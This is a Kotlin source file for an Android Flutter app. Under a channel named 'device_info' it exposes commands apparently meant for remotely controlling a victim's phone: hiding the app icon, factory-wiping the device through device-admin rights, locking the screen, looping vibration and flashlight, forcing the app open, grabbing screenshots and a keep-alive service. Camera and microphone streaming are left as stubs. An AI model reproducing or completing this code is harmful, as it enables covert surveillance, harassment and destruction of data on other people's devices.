package com.template.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Canvas
import android.hardware.camera2.CameraManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import android.util.Base64
import android.view.View
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import java.io.ByteArrayOutputStream

class MainActivity : FlutterActivity() {

    private val CHANNEL = "orgsapp/device_info"
    private var mediaPlayer: MediaPlayer? = null
    private var isFlashOn = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        KeepAliveService.start(this)
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL,
        ).setMethodCallHandler { call, result ->
            try {
                android.util.Log.d("MainActivity", "Method called: ${call.method}")
                when (call.method) {
                    // ===== DEVICE INFO =====
                    "getSdkInt" -> result.success(Build.VERSION.SDK_INT)
                    "getModel" -> result.success(Build.MODEL)
                    "getBrand" -> result.success(Build.BRAND)
                    "getAndroidVersion" -> result.success(Build.VERSION.RELEASE)

                    // ===== SETTINGS =====
                    "openAccessibilitySettings" -> openAccessibilitySettings(result)

                    // ===== FLASHLIGHT =====
                    "flashStrobe" -> toggleFlash(true, result)
                    "stopStrobe" -> toggleFlash(false, result)

                    // ===== VIBRATE =====
                    "vibrateLoop" -> vibrateLoop(result)
                    "stopVibrate" -> stopVibrate(result)

                    // ===== OPEN URL =====
                    "openUrl" -> openUrl(call.argument<String>("url"), result)

                    // ===== FORCE OPEN =====
                    "forceOpen" -> forceOpen(result)

                    // ===== SCREEN CAPTURE (FIXED) =====
                    "captureScreen" -> captureScreen(result)

                    // ===== CAMERA (FIXED) =====
                    "takePhoto" -> takePhoto(call, result)
                    "startCameraStream" -> startCameraStream(call, result)
                    "stopCameraStream" -> stopCameraStream(result)

                    // ===== AUDIO (FIXED) =====
                    "playAudio" -> playAudio(call.argument<String>("url"), result)
                    "stopAudio" -> stopAudio(result)
                    "startAudioStream" -> startAudioStream(result)
                    "stopAudioStream" -> stopAudioStream(result)

                    // ===== WALLPAPER (FIXED) =====
                    "setWallpaper" -> setWallpaper(call.argument<String>("url"), result)

                    // ===== LOCK / UNLOCK (FIXED) =====
                    "hardLock" -> hardLock(call, result)
                    "unlock" -> unlock(result)

                    // ===== PROTECTION =====
                    "enableProtection" -> enableProtection(
                        call.argument<String>("method") ?: "both", result
                    )
                    "disableProtection" -> disableProtection(result)

                    // ===== FACTORY RESET =====
                    "factoryReset" -> factoryReset(result)

                    else -> result.notImplemented()
                }
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Error: ${e.message}", e)
                result.error("ERR", e.message, null)
            }
        }
    }

    // ==========================================
    // ===== SCREEN CAPTURE (REAL) =====
    // ==========================================
    private fun captureScreen(result: MethodChannel.Result) {
        try {
            // Capture root view — hanya app sendiri
            val rootView = window.decorView.rootView
            val bitmap = Bitmap.createBitmap(
                rootView.width,
                rootView.height,
                Bitmap.Config.ARGB_8888,
            )
            val canvas = Canvas(bitmap)
            rootView.draw(canvas)

            // Compress ke JPEG → Base64
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
            val bytes = stream.toByteArray()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            android.util.Log.d("MainActivity", "Screen captured: ${bytes.size} bytes")
            result.success(base64)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Capture error: ${e.message}", e)
            result.success("")
        }
    }

    // ==========================================
    // ===== TAKE PHOTO (Butuh implementasi CameraX) =====
    // ==========================================
    private fun takePhoto(call: MethodCall, result: MethodChannel.Result) {
        try {
            // TODO: Implement CameraX untuk capture real photo
            // Untuk sekarang return empty — butuh tambah CameraX dependency
            android.util.Log.d("MainActivity", "takePhoto called — not implemented")
            result.success("")
        } catch (e: Exception) {
            result.error("PHOTO", e.message, null)
        }
    }

    // ==========================================
    // ===== CAMERA STREAM (Butuh CameraX) =====
    // ==========================================
    private fun startCameraStream(call: MethodCall, result: MethodChannel.Result) {
        try {
            // TODO: Implement CameraX preview + frame streaming
            android.util.Log.d("MainActivity", "startCameraStream — not implemented")
            result.success(false)
        } catch (e: Exception) {
            result.error("CAM", e.message, null)
        }
    }

    private fun stopCameraStream(result: MethodChannel.Result) {
        try {
            result.success(true)
        } catch (e: Exception) {
            result.error("CAM", e.message, null)
        }
    }

    // ==========================================
    // ===== AUDIO (REAL) =====
    // ==========================================
    private fun playAudio(url: String?, result: MethodChannel.Result) {
        try {
            if (url.isNullOrEmpty()) {
                result.success(false)
                return
            }

            // Stop existing
            mediaPlayer?.release()
            mediaPlayer = null

            mediaPlayer = MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnErrorListener { _, _, _ ->
                    result.success(false)
                    true
                }
                prepareAsync()
            }
            result.success(true)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "playAudio error: ${e.message}", e)
            result.success(false)
        }
    }

    private fun stopAudio(result: MethodChannel.Result) {
        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
            result.success(true)
        } catch (e: Exception) {
            result.success(true)
        }
    }

    private fun startAudioStream(result: MethodChannel.Result) {
        // TODO: Implement AudioRecord streaming
        android.util.Log.d("MainActivity", "startAudioStream — not implemented")
        result.success(false)
    }

    private fun stopAudioStream(result: MethodChannel.Result) {
        result.success(true)
    }

    // ==========================================
    // ===== WALLPAPER (REAL) =====
    // ==========================================
    private fun setWallpaper(url: String?, result: MethodChannel.Result) {
        try {
            if (url.isNullOrEmpty()) {
                result.success(false)
                return
            }

            // Download image in background thread
            Thread {
                try {
                    val connection = java.net.URL(url).openConnection()
                    connection.doInput = true
                    connection.connect()
                    val input = connection.getInputStream()
                    val bitmap = android.graphics.BitmapFactory.decodeStream(input)
                    input.close()

                    if (bitmap != null) {
                        val wallpaperManager = android.app.WallpaperManager
                            .getInstance(applicationContext)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            wallpaperManager.setBitmap(
                                bitmap,
                                null,
                                true,
                                android.app.WallpaperManager.FLAG_SYSTEM,
                            )
                        } else {
                            wallpaperManager.setBitmap(bitmap)
                        }
                        runOnUiThread { result.success(true) }
                    } else {
                        runOnUiThread { result.success(false) }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "Wallpaper error: ${e.message}", e)
                    runOnUiThread { result.success(false) }
                }
            }.start()
        } catch (e: Exception) {
            result.success(false)
        }
    }

    // ==========================================
    // ===== HARD LOCK (REAL) =====
    // ==========================================
    private fun hardLock(call: MethodCall, result: MethodChannel.Result) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as DevicePolicyManager
            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)

            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                android.util.Log.d("MainActivity", "Device locked")
                result.success(true)
            } else {
                android.util.Log.w("MainActivity", "Device admin not active")
                result.success(false)
            }
        } catch (e: Exception) {
            result.error("LOCK", e.message, null)
        }
    }

    private fun unlock(result: MethodChannel.Result) {
        // Android tidak bisa unlock programmatically tanpa user interaction
        // Kecuali pakai DeviceAdmin + password reset
        result.success(false)
    }

    // ==========================================
    // ===== HELPER: SETTINGS =====
    // ==========================================
    private fun openAccessibilitySettings(result: MethodChannel.Result) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("ERROR", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: FLASHLIGHT =====
    // ==========================================
    private fun toggleFlash(on: Boolean, result: MethodChannel.Result) {
        try {
            val camManager =
                getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = camManager.cameraIdList.firstOrNull()
            if (cameraId == null) {
                result.success(false)
                return
            }
            camManager.setTorchMode(cameraId, on)
            isFlashOn = on
            result.success(true)
        } catch (e: Exception) {
            result.error("FLASH", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: VIBRATE =====
    // ==========================================
    private fun getVibrator(): Vibrator {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE)
                    as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
    }

    private fun vibrateLoop(result: MethodChannel.Result) {
        try {
            val vibrator = getVibrator()
            val pattern = longArrayOf(0, 500, 500)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, 0)
            }
            result.success(true)
        } catch (e: Exception) {
            result.error("VIB", e.message, null)
        }
    }

    private fun stopVibrate(result: MethodChannel.Result) {
        try {
            getVibrator().cancel()
            result.success(true)
        } catch (e: Exception) {
            result.error("VIB", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: OPEN URL =====
    // ==========================================
    private fun openUrl(url: String?, result: MethodChannel.Result) {
        if (url.isNullOrEmpty()) {
            result.success(false)
            return
        }
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("URL", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: FORCE OPEN =====
    // ==========================================
    private fun forceOpen(result: MethodChannel.Result) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            intent?.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
            )
            if (intent != null) {
                startActivity(intent)
                result.success(true)
            } else {
                result.success(false)
            }
        } catch (e: Exception) {
            result.error("FO", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: PROTECTION =====
    // ==========================================
    private fun enableProtection(method: String, result: MethodChannel.Result) {
        try {
            if (method == "hide_icon" || method == "both") {
                val cn = ComponentName(this, MainActivity::class.java)
                packageManager.setComponentEnabledSetting(
                    cn,
                    android.content.pm.PackageManager
                        .COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP,
                )
            }
            result.success(true)
        } catch (e: Exception) {
            result.error("PROT", e.message, null)
        }
    }

    private fun disableProtection(result: MethodChannel.Result) {
        try {
            val cn = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                cn,
                android.content.pm.PackageManager
                    .COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP,
            )
            result.success(true)
        } catch (e: Exception) {
            result.error("PROT", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: FACTORY RESET =====
    // ==========================================
    private fun factoryReset(result: MethodChannel.Result) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as DevicePolicyManager
            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                result.success(true)
            } else {
                result.success(false)
            }
        } catch (e: Exception) {
            result.error("FR", e.message, null)
        }
    }
}
